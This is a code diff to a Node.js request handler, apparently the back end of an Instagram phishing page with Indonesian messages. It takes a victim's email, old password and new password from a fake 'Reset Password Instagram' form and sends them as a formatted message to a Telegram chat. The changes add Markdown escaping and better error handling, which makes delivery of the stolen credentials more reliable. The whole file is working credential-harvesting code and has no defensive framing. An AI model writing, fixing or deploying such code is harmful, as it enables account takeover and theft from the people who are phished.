@@ -1,3 +1,5 @@
+import fetch from 'node-fetch';
+
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Metode tidak diizinkan' });
@@ -16,14 +18,19 @@ export default async function handler(req, res) {
     return res.status(500).json({ message: 'Konfigurasi tidak tersedia' });
   }
 
+  // Escape karakter MarkdownV2
+  const escapeMarkdown = (text) => {
+    return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
+  };
+
   const text = `
 🔐 *Reset Password Instagram*
 ━━━━━━━━━━━━━━━━━━
-📧 *Email:* \`${email}\`
-🔑 *Password Lama:* \`${oldPass}\`
-🆕 *Password Baru:* \`${newPass}\`
+📧 *Email:* \`${escapeMarkdown(email)}\`
+🔑 *Password Lama:* \`${escapeMarkdown(oldPass)}\`
+🆕 *Password Baru:* \`${escapeMarkdown(newPass)}\`
 ━━━━━━━━━━━━━━━━━━
-🕒 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+🕒 ${escapeMarkdown(new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }))}
 `;
 
   try {
@@ -35,15 +42,20 @@ export default async function handler(req, res) {
       body: JSON.stringify({
         chat_id: chatId,
         text,
-        parse_mode: 'Markdown'
+        parse_mode: 'MarkdownV2'
       })
     });
 
-    if (!send.ok) throw new Error('Gagal mengirim');
+    const responseText = await send.text();
+
+    if (!send.ok) {
+      console.error('Telegram error:', send.status, responseText);
+      return res.status(500).json({ message: 'Gagal mengirim ke Telegram', detail: responseText });
+    }
 
     return res.status(200).json({ success: true });
   } catch (error) {
     console.error('Telegram error:', error);
-    return res.status(500).json({ message: 'Gagal mengirim ke Telegram' });
+    return res.status(500).json({ message: 'Gagal mengirim ke Telegram', error: error.message });
   }
 }
